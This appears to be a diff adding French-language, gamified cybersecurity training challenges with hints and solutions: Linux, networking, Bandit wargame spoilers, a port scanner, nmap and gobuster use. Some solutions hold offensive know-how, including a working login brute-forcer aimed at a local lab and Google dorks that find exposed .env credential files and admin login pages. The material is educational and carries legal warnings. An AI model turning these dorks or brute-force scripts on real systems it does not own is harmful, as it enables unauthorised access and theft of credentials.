+      "Dans ton terminal Linux : crée un dossier `chasseur`, va dedans, crée 3 fichiers vides (`fichier1.txt`, `fichier2.txt`, `note.md`), liste les fichiers, change les permissions de `note.md` pour qu'il soit exécutable.",
+      "`ls -la` montre les 3 fichiers et `note.md` a `rwx` quelque part dans ses permissions.",
+      "Les commandes : mkdir, cd, touch, ls, chmod. La permission exécutable c'est +x.",
+      "```\nmkdir chasseur\ncd chasseur\ntouch fichier1.txt fichier2.txt note.md\nls -la\nchmod +x note.md\nls -la\n```"),
+    c('em1c3', 'Trouver et lire', '15 min',
+      "Dans ton home (/home/ton-user), trouve TOUS les fichiers `.txt` qui existent (cherche partout), puis affiche le contenu du fichier `/etc/os-release`.",
+      "Tu sais lister les fichiers .txt avec une seule commande, et tu peux afficher le contenu d'un fichier sans l'ouvrir dans un éditeur.",
+      "Pour chercher : `find`. Pour afficher : `cat`.",
+      "```\nfind ~ -name \"*.txt\" 2>/dev/null\ncat /etc/os-release\n```\nLe `2>/dev/null` cache les erreurs de permissions."),
+    l('em1l1', 'Boss perso : 1 semaine sans souris', '7 jours',
+      "Pendant 7 jours dans ta VM Linux, force-toi à TOUT faire au clavier : navigation entre fenêtres (Alt+Tab), terminal (Ctrl+Alt+T), copier-coller (Ctrl+Shift+C/V dans terminal), fermer fenêtre (Alt+F4). Pas de souris pour les actions courantes. Apprends 5 raccourcis nouveaux par jour.",
+      "Au bout de 7 jours, tu fais 80% de tes actions de base au clavier sans réfléchir. Le terminal te semble naturel.",
+      "Liste utile : Tab (autocomplétion), Ctrl+R (recherche dans historique), Ctrl+L (clear), Ctrl+A/E (début/fin de ligne), Ctrl+W (effacer mot), Ctrl+U (effacer ligne). En GUI : Super (logo), Super+arrows.",
+      "C'est une habitude à construire, pas une commande. Crée un fichier ~/raccourcis.md où tu notes chaque jour les nouveaux raccourcis appris. Au jour 7, relis ton fichier — tu auras une vraie boîte à outils."),
+  ],
+  'e-main-2': [
+    c('em2c1', 'Identifier les couches OSI', '15 min',
+      "Sur une feuille (ou un .md), pour chacune de ces actions, dis quelle couche OSI est principalement impliquée : (1) tu tapes google.com dans Chrome, (2) le DNS résout l'IP, (3) ton routeur transmet le paquet, (4) Wi-Fi envoie les bits, (5) HTTPS chiffre la connexion.",
+      "Tu peux justifier ta réponse pour chaque action en 1 phrase.",
+      "Les 7 couches : Physique, Liaison, Réseau, Transport, Session, Présentation, Application. Pense : 'Please Do Not Throw Sausage Pizza Away'.",
+      "1. Application (couche 7) — Chrome est une appli HTTP\n2. Application aussi (DNS = appli) MAIS utilise Transport (UDP)\n3. Réseau (couche 3) — routage IP\n4. Physique + Liaison (1 et 2) — transmission radio + frames\n5. Présentation (6) — TLS chiffre les données"),
+    c('em2c2', 'Calcul de sous-réseau', '20 min',
+      "Pour le réseau `192.168.10.0/26`, calcule : (1) le masque de sous-réseau en notation décimale, (2) le nombre d'IP totales, (3) le nombre d'IP utilisables (hôtes), (4) la première et dernière IP utilisable, (5) l'adresse de broadcast.",
+      "Tu trouves les 5 réponses en moins de 5 min sans calculatrice (juste de tête).",
+      "/26 = 26 bits à 1 dans le masque. 32-26 = 6 bits pour les hôtes. 2^6 = 64 IPs total. Toujours -2 pour les hôtes (réseau + broadcast).",
+      "1. Masque : 255.255.255.192 (les 26 premiers bits = 1, soit 11111111.11111111.11111111.11000000)\n2. 2^(32-26) = 2^6 = 64 IPs\n3. 64 - 2 = 62 hôtes utilisables\n4. Première : 192.168.10.1 / Dernière : 192.168.10.62\n5. Broadcast : 192.168.10.63"),
+    c('em2c3', 'Wireshark : ta première capture', '20 min',
+      "Installe Wireshark, lance une capture sur ton interface réseau, ouvre Firefox/Chrome, va sur `http://example.com` (HTTP, pas HTTPS), arrête la capture. Trouve les paquets HTTP et identifie : la requête GET, la réponse HTTP 200 OK.",
+      "Tu peux montrer dans Wireshark le paquet GET / HTTP/1.1 et le paquet HTTP/1.1 200 OK qui suit.",
+      "Filtre Wireshark pour ne voir que HTTP : tape `http` dans la barre de filtre en haut. Pour voir les détails d'un paquet : clique dessus, regarde le panneau du milieu.",
+      "1. Wireshark > sélectionne ton interface (eth0/wlan0) > démarre capture\n2. Ouvre navigateur > http://example.com (PAS https)\n3. Arrête capture (carré rouge)\n4. Filtre : `http`\n5. Cherche le paquet \"GET / HTTP/1.1\" en bleu, et juste après \"HTTP/1.1 200 OK\"\n6. Clique pour voir tous les headers"),
+    l('em2l1', 'Boss perso : Réseau Cisco Packet Tracer', '1h30',
+      "Dans Cisco Packet Tracer (gratuit après inscription Cisco NetAcad), construis ce réseau : 2 routeurs reliés entre eux (avec câble série ou ethernet), chaque routeur a un switch derrière, chaque switch a 2 PCs. Configure les IPs (sous-réseau A : 192.168.1.0/24, sous-réseau B : 192.168.2.0/24), configure le routage statique entre les 2 routeurs, et fais en sorte qu'un PC du sous-réseau A puisse PING un PC du sous-réseau B.",
+      "Tu lances un `ping 192.168.2.10` depuis le PC1 du réseau A vers PC1 du réseau B et ça répond avec succès (4 réponses, 0% loss).",
+      "Configuration de chaque PC : IP + masque + GATEWAY (= IP du routeur côté de ce PC). Sur un routeur, mode privilégié : `enable`, mode config : `configure terminal`, configurer une interface : `interface gi0/0` puis `ip address 192.168.1.1 255.255.255.0` puis `no shutdown`. Routes statiques : `ip route <réseau-distant> <masque> <ip-prochain-saut>`.",
+      "Topologie :\n```\nPC1-A --+\n        +--[Switch1]--[R1]====[R2]--[Switch2]--+ PC1-B\nPC2-A --+                                       + PC2-B\n```\n\n**Sur R1** :\n```\nenable\nconf t\ninterface gi0/0\n ip address 192.168.1.1 255.255.255.0\n no shutdown\ninterface gi0/1\n ip address 10.0.0.1 255.255.255.252\n no shutdown\nip route 192.168.2.0 255.255.255.0 10.0.0.2\nend\n```\n\n**Sur R2** : pareil mais inverse les sous-réseaux et les IPs (192.168.2.x / 10.0.0.2 / route vers 192.168.1.0 via 10.0.0.1).\n\n**Sur PC1-A** : IP 192.168.1.10 / Masque 255.255.255.0 / Gateway 192.168.1.1.\n\nFais `ping 192.168.2.10` depuis PC1-A → ça doit marcher."),
+  ],
+  'e-daily': [
+    c('eDc1', 'Routine du Chasseur', 'quotidien',
+      "Mets en place TA routine : (1) crée un dossier `~/hunter-journal`, (2) à la fin de chaque journée d'apprentissage, écris dans un fichier `YYYY-MM-DD.md` ce que tu as appris, (3) ce qui t'a bloqué, (4) ce que tu veux faire demain.",
+      "Tu as 3 entrées sur 3 jours consécutifs minimum.",
+      "Format conseillé pour chaque jour : Date, ## Appris, ## Bloqué sur, ## Demain. Markdown c'est juste du texte avec des # pour titres.",
+      "```bash\nmkdir ~/hunter-journal && cd ~/hunter-journal\ncat > 2026-05-09.md << 'EOF'\n# Jour 1 — $(date)\n\n## Appris\n- Modèle OSI les 7 couches\n- Différence TCP vs UDP\n\n## Bloqué sur\n- Calcul de subnet /23\n\n## Demain\n- Refaire les exos subnet\n- Finir Bandit niveau 5\nEOF\n```"),
+    c('eDc2', 'Suivre 3 comptes infosec', '15 min',
+      "Crée un compte Twitter/X ou Mastodon dédié à ton apprentissage. Suis 3 comptes : un FR (ex: @SaxX_), un EN (ex: @TheHackersNews), un chercheur (ex: @TalBeerySec). Chaque jour, lis 1 post.",
+      "Tu as un fil avec du contenu cybersécu pertinent quand tu ouvres l'app Twitter/Mastodon.",
+      "Sur Mastodon, l'instance infosec.exchange est THE référence en cybersécu. Sur Twitter/X, suis @hacks4pancakes, @SwiftOnSecurity, @briankrebs.",
+      "Comptes à suivre (FR + EN) :\n- FR : @SaxX_ (Clément Domingo), @SwitHak, @SyMosTik\n- EN : @TheHackersNews, @briankrebs, @hacks4pancakes, @SwiftOnSecurity, @malwaretech\n- Mastodon : infosec.exchange/@cR0w, @swelljoe@infosec.exchange"),
+  ],
+  'e-boss': [
+    c('eBc1', 'Bandit 0 → 5', '1h',
+      "Connecte-toi à OverTheWire Bandit niveau 0 et avance jusqu'au niveau 5. Note CHAQUE mot de passe trouvé dans ton hunter-journal (tu en auras besoin si tu reviens).",
+      "Tu peux te connecter en SSH au niveau 5 avec son mot de passe.",
+      "Niveau 0 : `ssh bandit0@bandit.labs.overthewire.org -p 2220` (mdp: bandit0). Lis le fichier `readme`. Pour les niveaux suivants, lis bien la consigne sur overthewire.org/wargames/bandit/ avant de te connecter — chaque niveau t'apprend une nouvelle commande.",
+      "Spoiler — utilise comme dernier recours :\n- N0→N1 : `cat readme`\n- N1→N2 : `cat ./-` (tiret = stdin, donc on précise le path)\n- N2→N3 : `cat \"spaces in this filename\"` (guillemets pour les espaces)\n- N3→N4 : `cd inhere; ls -la; cat .hidden` (fichier caché)\n- N4→N5 : `cd inhere; file ./*; cat ./-file07` (file pour identifier le type)\n- N5→N6 : `find inhere -size 1033c -readable ! -executable -exec cat {} \\;`"),
+    c('eBc2', 'Bandit 6 → 10', '1h30',
+      "Continue depuis le niveau 6 jusqu'au niveau 10. Ces niveaux introduisent `find` avancé, `grep`, `sort`, `uniq`, et la manipulation de strings.",
+      "Tu peux te connecter en SSH au niveau 10.",
+      "Pense pipes : `commande1 | commande2 | commande3`. Pour chercher dans plusieurs fichiers : `grep -r \"pattern\" .`. Pour les fichiers contenant des chaînes lisibles dans un binaire : `strings`.",
+      "- N6→N7 : `find / -user bandit7 -group bandit6 -size 33c 2>/dev/null`\n- N7→N8 : `grep millionth data.txt`\n- N8→N9 : `sort data.txt | uniq -u`\n- N9→N10 : `strings data.txt | grep ===`\n- N10→N11 : `cat data.txt | base64 -d`"),
+    l('eBl1', 'Bandit 11 → 15 (le marathon)', '2h',
+      "Avance du niveau 11 au niveau 15. Tu vas découvrir : ROT13, fichiers temporaires, SSH avec clé privée, OpenSSL.",
+      "Tu peux te connecter en SSH au niveau 15.",
+      "ROT13 : utilise `tr 'A-Za-z' 'N-ZA-Mn-za-m'`. Pour SSH avec clé : `ssh -i sshkey.private user@host -p 2220`. Pour OpenSSL avec TLS : `openssl s_client -connect host:port`.",
+      "- N11→N12 : `cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'`\n- N12→N13 : `mkdir /tmp/work; cp data.txt /tmp/work/; cd /tmp/work; xxd -r data.txt > out` puis identifier le format (gzip/bzip2/tar) avec `file` et décompresser en boucle (gunzip, bunzip2, tar xf...)\n- N13→N14 : `ssh -i sshkey.private bandit14@localhost -p 2220`\n- N14→N15 : `cat /etc/bandit_pass/bandit14 | nc localhost 30000`\n- N15→N16 : `openssl s_client -connect localhost:30001` puis paste le mdp précédent"),
+  ],
+  // ============= RANG D =============
+  'd-main-1': [
+    c('dm1c1', 'Hello, Hacker', '20 min',
+      "Écris un script Python `hello.py` qui : (1) demande ton nom à l'utilisateur, (2) demande son rang (E/D/C/B/A/S), (3) affiche `Bienvenue, [nom] de rang [rang]. Niveau XP suggéré : [...]` où le niveau XP dépend du rang (E=400, D=800, C=1310, B=2020, A=3500, S=99999).",
+      "Tu lances `python3 hello.py`, ça te demande ton nom + rang, et ça affiche le bon XP en sortie.",
+      "Utilise `input()` pour demander, et un dictionnaire pour mapper rang → XP.",
+      "```python\nrangs = {'E': 400, 'D': 800, 'C': 1310, 'B': 2020, 'A': 3500, 'S': 99999}\n\nnom = input(\"Ton nom : \")\nrang = input(\"Ton rang (E/D/C/B/A/S) : \").upper()\n\nif rang in rangs:\n    print(f\"Bienvenue, {nom} de rang {rang}. Niveau XP suggéré : {rangs[rang]}\")\nelse:\n    print(\"Rang inconnu.\")\n```"),
+    c('dm1c2', 'Parser un fichier de logs', '30 min',
+      "Crée un fichier `access.log` avec 20 lignes de logs HTTP fictifs (format : `IP - DATE - METHOD URL STATUS`). Écris un script Python qui lit ce fichier, compte combien de requêtes par IP, et affiche le top 3 des IPs les plus actives.",
+      "Ton script affiche un classement comme `192.168.1.5 : 8 requêtes` pour les 3 IPs avec le plus de hits.",
+      "Utilise un dictionnaire pour compter, et `sorted()` avec `key=` et `reverse=True` pour le tri. La méthode `.split()` te permet de découper une ligne.",
+      "```python\nfrom collections import Counter\n\ncounts = Counter()\nwith open('access.log', 'r') as f:\n    for line in f:\n        ip = line.split(' - ')[0]\n        counts[ip] += 1\n\ntop3 = counts.most_common(3)\nfor ip, n in top3:\n    print(f\"{ip} : {n} requêtes\")\n```"),
+    c('dm1c3', 'Mini scanner de ports (TCP)', '45 min',
+      "Écris un script `scanner.py` qui prend un host (ex: `scanme.nmap.org`) et scanne les ports 20 à 100 en TCP. Pour chaque port ouvert, affiche `[OPEN] port X`. Pour les fermés/filtered, n'affiche rien.",
+      "Tu lances `python3 scanner.py scanme.nmap.org` et tu vois apparaître au moins le port 22 (SSH) et le port 80 (HTTP) comme OPEN.",
+      "Utilise le module `socket`. `socket.socket(socket.AF_INET, socket.SOCK_STREAM)` crée un socket TCP. `.settimeout(0.5)` évite d'attendre trop longtemps. `.connect_ex((host, port))` retourne 0 si OK.",
+      "```python\nimport socket\nimport sys\n\nhost = sys.argv[1] if len(sys.argv) > 1 else 'scanme.nmap.org'\n\nfor port in range(20, 101):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.settimeout(0.5)\n    try:\n        if s.connect_ex((host, port)) == 0:\n            print(f\"[OPEN] port {port}\")\n    except: pass\n    finally:\n        s.close()\n```\n⚠️ Ne scanne JAMAIS un host qui n'est pas à toi ou scanme.nmap.org (autorisé pour l'apprentissage)."),
+    l('dm1l1', 'BOSS — Brute force d\'un mot de passe (lab perso)', '2h',
+      "Crée un mini-serveur web Python (Flask ou http.server) qui demande un mot de passe via un POST sur /login. Choisis un mot de passe simple à 4 chiffres (ex: 1337). Puis écris un autre script qui essaie tous les codes de 0000 à 9999 jusqu'à trouver le bon.",
+      "Ton brute-forcer trouve le mot de passe en moins de 2 minutes et te l'affiche.",
+      "Pour le serveur : `from http.server import...` ou `Flask`. Pour le brute force : `requests.post(url, data={'pwd': code})` puis check le status code ou contenu de la réponse. Itère sur `range(10000)` formaté en 4 digits avec `f'{i:04d}'`.",
+      "**Serveur (server.py)** :\n```python\nfrom flask import Flask, request\napp = Flask(__name__)\nPASSWORD = '1337'\n\n@app.route('/login', methods=['POST'])\ndef login():\n    if request.form.get('pwd') == PASSWORD:\n        return 'OK', 200\n    return 'NOPE', 401\n\napp.run(port=5000)\n```\n\n**Brute-forcer (attack.py)** :\n```python\nimport requests, time\nstart = time.time()\nfor i in range(10000):\n    code = f'{i:04d}'\n    r = requests.post('http://localhost:5000/login', data={'pwd': code})\n    if r.status_code == 200:\n        print(f'[+] FOUND: {code} en {time.time()-start:.1f}s')\n        break\n```\n\n⚠️ Lab PERSO uniquement. Brute-forcer un site qui n'est pas à toi = délit."),
+  ],
+  'd-main-2': [
+    c('dm2c1', 'Premier script bash', '15 min',
+      "Crée un script `info.sh` qui affiche : ton username, le nombre de fichiers dans /etc, la date du jour, et l'espace disque libre sur /. Rends-le exécutable et lance-le.",
+      "Tu lances `./info.sh` et tu vois les 4 infos affichées.",
+      "Utilise `whoami`, `ls /etc | wc -l`, `date`, `df -h /`. Pour rendre exécutable : `chmod +x info.sh`. Première ligne du script : `#!/bin/bash`.",
+      "```bash\n#!/bin/bash\necho \"Utilisateur : $(whoami)\"\necho \"Fichiers dans /etc : $(ls /etc | wc -l)\"\necho \"Date : $(date)\"\necho \"Espace libre /: $(df -h / | awk 'NR==2 {print $4}')\"\n```\nPuis : `chmod +x info.sh && ./info.sh`"),
+    c('dm2c2', 'Backup automatisé', '30 min',
+      "Écris un script `backup.sh` qui : (1) prend un dossier en argument, (2) crée une archive .tar.gz horodatée (`backup-YYYYMMDD-HHMMSS.tar.gz`), (3) affiche la taille de l'archive créée.",
+      "Tu lances `./backup.sh ~/Documents` et un fichier `backup-20260509-143022.tar.gz` est créé avec la taille affichée.",
+      "Pour la date formatée : `$(date +%Y%m%d-%H%M%S)`. Pour archiver : `tar -czf nom.tar.gz dossier`. Pour la taille : `du -h fichier`.",
+      "```bash\n#!/bin/bash\nif [ -z \"$1\" ]; then\n  echo \"Usage: $0 <dossier>\"\n  exit 1\nfi\nDATE=$(date +%Y%m%d-%H%M%S)\nNAME=\"backup-${DATE}.tar.gz\"\ntar -czf \"$NAME\" \"$1\"\necho \"Archive créée : $NAME ($(du -h \"$NAME\" | cut -f1))\"\n```"),
+    l('dm2l1', 'BOSS — Monitoring système maison', '1h30',
+      "Crée un script `monitor.sh` qui s'exécute en boucle infinie (toutes les 5 secondes) et affiche : CPU usage %, RAM usage %, disque libre, nombre d'utilisateurs connectés, top processus consommateur de RAM. Sauvegarde tout dans un log `monitor.log` avec timestamp.",
+      "Ton script tourne, affiche les stats live en console, et écrit chaque mesure dans `monitor.log`. Tu peux faire `Ctrl+C` proprement.",
+      "Boucle : `while true; do ... ; sleep 5; done`. CPU : `top -bn1` ou `mpstat`. RAM : `free`. Top process : `ps aux --sort=-%mem | head -2`. Pour append au log : `>> monitor.log`.",
+      "```bash\n#!/bin/bash\necho \"[$(date)] Démarrage du monitoring...\" | tee -a monitor.log\ntrap \"echo '[$(date)] Arrêt'; exit 0\" INT\n\nwhile true; do\n  TS=$(date +%H:%M:%S)\n  CPU=$(top -bn1 | grep 'Cpu(s)' | awk '{print $2}')\n  RAM=$(free | awk '/Mem:/ {printf \"%.1f%%\", $3/$2*100}')\n  DISK=$(df -h / | awk 'NR==2 {print $4}')\n  USERS=$(who | wc -l)\n  TOPPROC=$(ps aux --sort=-%mem | awk 'NR==2 {print $11}')\n  LINE=\"[$TS] CPU:$CPU% RAM:$RAM Disk:$DISK Users:$USERS Top:$TOPPROC\"\n  echo \"$LINE\"\n  echo \"$LINE\" >> monitor.log\n  sleep 5\ndone\n```"),
+  ],
+  'd-main-3': [
+    c('dm3c1', 'Inspecte un site', '20 min',
+      "Sur Firefox/Chrome, ouvre les DevTools (F12) et va sur `https://github.com`. Dans l'onglet Network, identifie : (1) la première requête HTML, (2) les headers de réponse incluant Content-Type, (3) un cookie envoyé par le serveur.",
+      "Tu peux pointer dans les DevTools chacun des 3 éléments demandés.",
+      "F12 ouvre les DevTools. Onglet Network, recharge la page (Ctrl+R), clique sur la 1ère requête en haut. Tu verras Headers, Cookies, Response, etc.",
+      "1. Network tab > Recharge (Ctrl+R) > Première ligne tout en haut = github.com (type: document)\n2. Clique dessus > Headers > Response Headers > cherche `content-type: text/html`\n3. Headers > Response Headers > cherche `set-cookie:` OU onglet Cookies"),
+    c('dm3c2', 'Première API call', '25 min',
+      "Utilise `curl` (ou Postman) pour faire un GET sur l'API publique `https://api.github.com/users/torvalds`. Récupère la réponse JSON, identifie le nombre de followers et de repos publics.",
+      "Tu sais combien Linus Torvalds a de followers et de repos publics, et tu peux montrer la commande exacte qui te l'a donné.",
+      "`curl https://api.github.com/users/torvalds`. Pour parser le JSON joliment, ajoute `| jq` (installer jq si besoin avec `sudo apt install jq`).",
+      "```bash\ncurl -s https://api.github.com/users/torvalds | jq\n# ou pour juste les 2 champs :\ncurl -s https://api.github.com/users/torvalds | jq '{followers, public_repos}'\n```"),
+    l('dm3l1', 'BOSS — Mini site avec auth', '2h',
+      "Crée un mini-site web (Flask ou Node/Express, au choix) avec : (1) une page de login avec form (user+password), (2) une page protégée /dashboard accessible seulement après login (utilise une session/cookie), (3) un bouton logout. Mot de passe en dur OK pour ce challenge.",
+      "Tu peux : aller sur /dashboard sans login → tu es bloqué/redirigé. Login avec admin/secret123 → tu accèdes au dashboard. Logout → tu es redirigé et /dashboard est de nouveau bloqué.",
+      "Flask : utilise `flask` + `flask-login` ou juste `session['user'] = ...`. Le secret de session : `app.secret_key = 'change-me'`. Vérifie avec `if 'user' in session:`.",
+      "```python\nfrom flask import Flask, request, session, redirect, render_template_string\n\napp = Flask(__name__)\napp.secret_key = 'changeme'\nUSERS = {'admin': 'secret123'}\n\n@app.route('/')\ndef home():\n    return '<a href=\"/login\">Login</a> <a href=\"/dashboard\">Dashboard</a>'\n\n@app.route('/login', methods=['GET','POST'])\ndef login():\n    if request.method == 'POST':\n        u, p = request.form.get('user'), request.form.get('pwd')\n        if USERS.get(u) == p:\n            session['user'] = u\n            return redirect('/dashboard')\n        return 'Bad credentials', 401\n    return '<form method=\"post\">User:<input name=user> Pwd:<input name=pwd type=password><button>Go</button></form>'\n\n@app.route('/dashboard')\ndef dashboard():\n    if 'user' not in session:\n        return redirect('/login')\n    return f'Bienvenue {session[\"user\"]} ! <a href=\"/logout\">Logout</a>'\n\n@app.route('/logout')\ndef logout():\n    session.pop('user', None)\n    return redirect('/')\n\napp.run(debug=True)\n```"),
+  ],
+  'd-main-4': [
+    c('dm4c1', 'Hash et reconnais', '15 min',
+      "Hash le mot 'hunter2' avec MD5, SHA-1, SHA-256 et bcrypt en ligne de commande. Compare les longueurs.",
+      "Tu peux montrer 4 hashes différents du même mot et expliquer pourquoi bcrypt est différent à chaque exécution.",
+      "MD5 : `echo -n 'hunter2' | md5sum`. SHA-256 : `sha256sum`. Bcrypt : `htpasswd -bnBC 10 \"\" hunter2 | tr -d ':\\n'` (htpasswd installable avec apache2-utils).",
+      "```bash\necho -n 'hunter2' | md5sum\n# f3f9b7f5fb87f4abc...\necho -n 'hunter2' | sha1sum\necho -n 'hunter2' | sha256sum\nhtpasswd -bnBC 10 \"\" hunter2 | tr -d ':\\n'\n# bcrypt change à chaque fois car salé\n```\nMD5=128 bits=32 hex, SHA-1=160 bits=40 hex, SHA-256=256 bits=64 hex. Bcrypt inclut le salt → toujours différent."),
+    c('dm4c2', 'CyberChef wizardry', '20 min',
+      "Sur https://gchq.github.io/CyberChef/, prends ce string : `SGVsbG8gQ2hhc3NldXIgIQ==` et décode-le. Puis prends `synf vf gur jnl` et applique ROT13.",
+      "Tu obtiens 2 phrases lisibles en français/anglais.",
+      "CyberChef → glisse `From Base64` dans la recipe pour le 1er. Pour ROT13 : drag `ROT13`. Tu vois le résultat en bas dans Output.",
+      "1. `SGVsbG8gQ2hhc3NldXIgIQ==` en Base64 → `Hello Chasseur !`\n2. `synf vf gur jnl` en ROT13 → `this is the way`"),
+    l('dm4l1', 'BOSS — Outil de chiffrement maison', '1h30',
+      "Écris un script Python `crypt.py` qui peut : (1) chiffrer un fichier avec AES-256 et un mot de passe donné, (2) déchiffrer le fichier avec le bon mot de passe. Utilise la lib `cryptography`.",
+      "Tu peux chiffrer un fichier `secret.txt`, l'envoyer à quelqu'un avec le mot de passe, et lui peut le déchiffrer avec ton script.",
+      "Installe : `pip install cryptography`. Utilise `Fernet` pour simplifier (AES-128 + HMAC, OK pour ce challenge). Pour AES-256 propre, utilise `Cipher(algorithms.AES(key), modes.CBC(iv))` avec une clé dérivée du mot de passe via PBKDF2.",
+      "```python\nfrom cryptography.fernet import Fernet\nfrom cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC\nfrom cryptography.hazmat.primitives import hashes\nimport base64, os, sys\n\ndef key_from_password(password, salt):\n    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000)\n    return base64.urlsafe_b64encode(kdf.derive(password.encode()))\n\ndef encrypt(file, password):\n    salt = os.urandom(16)\n    key = key_from_password(password, salt)\n    f = Fernet(key)\n    with open(file, 'rb') as fp: data = fp.read()\n    enc = f.encrypt(data)\n    with open(file + '.enc', 'wb') as fp:\n        fp.write(salt + enc)\n    print(f'Chiffré : {file}.enc')\n\ndef decrypt(file, password):\n    with open(file, 'rb') as fp: blob = fp.read()\n    salt, enc = blob[:16], blob[16:]\n    key = key_from_password(password, salt)\n    f = Fernet(key)\n    data = f.decrypt(enc)\n    with open(file.replace('.enc', '.dec'), 'wb') as fp:\n        fp.write(data)\n    print('Déchiffré.')\n\nif sys.argv[1] == 'enc': encrypt(sys.argv[2], sys.argv[3])\nelse: decrypt(sys.argv[2], sys.argv[3])\n```\nUsage : `python3 crypt.py enc secret.txt monpassword` puis `python3 crypt.py dec secret.txt.enc monpassword`."),
+  ],
+  'd-daily': [
+    c('dDc1', 'TryHackMe — Pre-Security', 'quotidien',
+      "Ouvre TryHackMe, fais 1 room par jour du parcours Pre-Security pendant 1 semaine. Note le nom de la room et 1 commande/concept appris dans ton hunter-journal.",
+      "Tu as 7 entrées dans ton journal correspondant à 7 rooms terminées.",
+      "Le parcours : tryhackme.com/path/outline/presecurity. Commence par 'What is Networking?'. Si tu as déjà des bases, saute aux modules Linux et Windows fundamentals.",
+      "Ordre conseillé du parcours :\n1. Cyber Security 101\n2. Network Fundamentals\n3. How the Web Works\n4. Linux Fundamentals 1, 2, 3\n5. Windows Fundamentals 1, 2, 3"),
+  ],
+  'd-boss': [
+    l('dBl1', 'BOSS — Projet Python perso', '4-6h',
+      "Construis un projet Python qui combine TOUT ce que t'as appris : un outil en CLI qui (1) scanne un host pour ses ports ouverts, (2) pour chaque port web (80, 443, 8080), récupère les headers HTTP, (3) sauvegarde le rapport dans un fichier .md horodaté, (4) optionnel : envoie le rapport par mail/webhook Discord.",
+      "Tu lances `python3 recon.py scanme.nmap.org` et tu obtiens un fichier `report-scanme.nmap.org-20260509.md` avec les ports + headers HTTP, formaté en markdown propre.",
+      "Combine `socket` (scanner) + `requests` (HTTP) + manipulation de fichiers + arguments CLI avec `argparse`. Pour Discord webhook : POST JSON sur l'URL du webhook. Pour mail : `smtplib`.",
+      "Squelette de base :\n```python\nimport socket, requests, sys, argparse\nfrom datetime import datetime\n\nWEB_PORTS = [80, 443, 8080, 8443]\n\ndef scan(host, ports):\n    open_ports = []\n    for p in ports:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(0.5)\n        if s.connect_ex((host, p)) == 0:\n            open_ports.append(p)\n        s.close()\n    return open_ports\n\ndef http_headers(host, port):\n    proto = 'https' if port in [443, 8443] else 'http'\n    try:\n        r = requests.get(f'{proto}://{host}:{port}', timeout=3)\n        return dict(r.headers)\n    except: return None\n\ndef report(host, ports, headers_map):\n    ts = datetime.now().strftime('%Y%m%d-%H%M%S')\n    fname = f'report-{host}-{ts}.md'\n    with open(fname, 'w') as f:\n        f.write(f'# Recon Report — {host}\\n\\n')\n        f.write(f'**Date** : {ts}\\n\\n')\n        f.write(f'## Ports ouverts\\n\\n')\n        for p in ports: f.write(f'- {p}\\n')\n        f.write(f'\\n## Headers HTTP\\n\\n')\n        for p, h in headers_map.items():\n            f.write(f'### Port {p}\\n```\\n')\n            for k, v in (h or {}).items(): f.write(f'{k}: {v}\\n')\n            f.write('```\\n\\n')\n    print(f'[+] Rapport : {fname}')\n\nparser = argparse.ArgumentParser()\nparser.add_argument('host')\nparser.add_argument('--ports', default='1-1024')\nargs = parser.parse_args()\n\nstart, end = map(int, args.ports.split('-'))\nopen_p = scan(args.host, range(start, end+1))\nheaders = {p: http_headers(args.host, p) for p in open_p if p in WEB_PORTS}\nreport(args.host, open_p, headers)\n```"),
+  ],
+
+  // ============= RANG C =============
+  'c-main-1': [
+    c('cm1c1', 'Nmap : ton premier scan', '20 min',
+      "Scanne `scanme.nmap.org` (host autorisé pour les tests). Identifie : (1) les ports ouverts, (2) les services/versions détectés, (3) l'OS probable.",
+      "Tu peux donner les 3 infos avec la commande exacte qui les a fournies.",
+      "Scan basique : `nmap scanme.nmap.org`. Avec versions : `-sV`. OS detection : `-O` (nécessite sudo). Tout en un : `nmap -A`.",
+      "```bash\nnmap -A scanme.nmap.org\n# OU plus rapide :\nsudo nmap -sV -O scanme.nmap.org\n```\nTu verras typiquement : 22/ssh, 80/http, et le serveur s'appelle 'Ack!' avec OS Linux."),
+    c('cm1c2', 'Google Dorking', '20 min',
+      "Trouve dans Google avec des dorks : (1) un fichier .pdf contenant 'rapport pentest' sur un site .gouv.fr, (2) une page de login admin sur un site .edu (sans cliquer dessus !), (3) des fichiers .env exposés par erreur.",
+      "Tu peux montrer 3 dorks avec les résultats correspondants.",
+      "Opérateurs Google : `site:`, `filetype:`, `inurl:`, `intitle:`, `intext:`. Combine-les avec des espaces.",
+      "1. `site:.gouv.fr filetype:pdf intext:\"rapport pentest\"`\n2. `site:.edu inurl:admin/login`\n3. `filetype:env intext:\"DB_PASSWORD\"` ⚠️ NE TÉLÉCHARGE PAS, NE TE CONNECTE PAS — c'est juste pour comprendre.\n\nC'est de l'OSINT passif, légal tant que tu ne télécharges/utilises pas les infos."),
+    c('cm1c3', 'Énumération web', '30 min',
+      "Sur ta propre machine, lance DVWA (Damn Vulnerable Web App) en Docker : `docker run --rm -it -p 80:80 vulnerables/web-dvwa`. Puis utilise gobuster pour trouver les répertoires cachés.",
+      "Tu trouves au moins 5 répertoires/fichiers (login.php, setup.php, security.php, etc.).",
+      "Wordlist par défaut : `/usr/share/wordlists/dirb/common.txt` (sur Kali) ou télécharge SecLists. Commande : `gobuster dir -u http://localhost -w wordlist.txt`.",
+      "```bash\n# Lance DVWA\ndocker run --rm -it -p 80:80 vulnerables/web-dvwa\n\n# Dans un autre terminal :\nwget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt\ngobuster dir -u http://localhost -w common.txt -t 50\n# OU avec ffuf :\nffuf -u http://localhost/FUZZ -w common.txt\n```"),
+    l('cm1l1', 'BOSS — Recon complet d\'une box THM', '2h',
+      "Sur TryHackMe, lance la room 'Basic Pentesting' (gratuite). Fais une phase de recon complète : scan nmap, énumération web, énumération SMB. Documente tout dans un rapport .md.",
+      "Tu as un rapport markdown listant : ports ouverts, services + versions, répertoires web cachés, partages SMB, users potentiels.",
+      "Méthodologie : (1) full TCP scan `nmap -p- ip`, (2) version scan sur ports ouverts, (3) gobuster sur le port web, (4) `enum4linux ip` pour SMB, (5) tu collectes les indices.",
